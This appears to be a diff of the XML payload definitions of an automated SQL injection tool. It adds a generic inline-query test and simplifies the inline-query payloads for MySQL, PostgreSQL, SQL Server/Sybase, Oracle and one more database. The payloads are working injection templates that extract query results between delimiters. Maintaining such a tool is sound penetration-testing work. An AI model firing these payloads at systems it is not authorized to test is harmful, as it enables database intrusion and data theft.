@@ -3,19 +3,31 @@
 <root>
     <!-- Inline queries tests -->
     <test>
-        <title>MySQL inline queries</title>
+        <title>Generic inline queries</title>
         <stype>3</stype>
         <level>1</level>
         <risk>1</risk>
         <clause>1,2,3,8</clause>
         <where>3</where>
+        <vector>(SELECT CONCAT(CONCAT('[DELIMITER_START]',([QUERY])),'[DELIMITER_STOP]'))</vector>
+        <request>
+            <payload>(SELECT CONCAT(CONCAT('[DELIMITER_START]',(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)),'[DELIMITER_STOP]'))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+    </test>
+
+    <test>
+        <title>MySQL inline queries</title>
+        <stype>3</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,2,3,8</clause>
+        <where>3</where>
         <vector>(SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))</vector>
         <request>
-            <!-- These work as good as ELT(), but are longer
-            <payload>(SELECT CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'))</payload>
-            <payload>(SELECT CONCAT('[DELIMITER_START]',(SELECT (MAKE_SET([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))</payload>
-            -->
-            <payload>(SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))</payload>
+            <payload>(SELECT CONCAT('[DELIMITER_START]',(ELT([RANDNUM]=[RANDNUM],1)),'[DELIMITER_STOP]'))</payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -28,7 +40,7 @@
     <test>
         <title>PostgreSQL inline queries</title>
         <stype>3</stype>
-        <level>1</level>
+        <level>2</level>
         <risk>1</risk>
         <clause>1,2,3,8</clause>
         <where>3</where>
@@ -47,13 +59,13 @@
     <test>
         <title>Microsoft SQL Server/Sybase inline queries</title>
         <stype>3</stype>
-        <level>1</level>
+        <level>2</level>
         <risk>1</risk>
         <clause>1,2,3,8</clause>
         <where>3</where>
         <vector>(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]')</vector>
         <request>
-            <payload>(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')</payload>
+            <payload>(SELECT '[DELIMITER_START]'+(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)+'[DELIMITER_STOP]')</payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -75,7 +87,7 @@
         <vector>(SELECT ('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]') FROM DUAL)</vector>
         <request>
             <!-- NOTE: Vertica works too without the TO_NUMBER() -->
-            <payload>(SELECT '[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN TO_NUMBER(1) ELSE TO_NUMBER(0) END) FROM DUAL)||'[DELIMITER_STOP]' FROM DUAL)</payload>
+            <payload>(SELECT '[DELIMITER_START]'||(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN TO_NUMBER(1) ELSE TO_NUMBER(0) END)||'[DELIMITER_STOP]' FROM DUAL)</payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -94,7 +106,7 @@
         <where>3</where>
         <vector>SELECT '[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]'</vector>
         <request>
-            <payload>SELECT '[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))||'[DELIMITER_STOP]'</payload>
+            <payload>SELECT '[DELIMITER_START]'||(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)||'[DELIMITER_STOP]'</payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
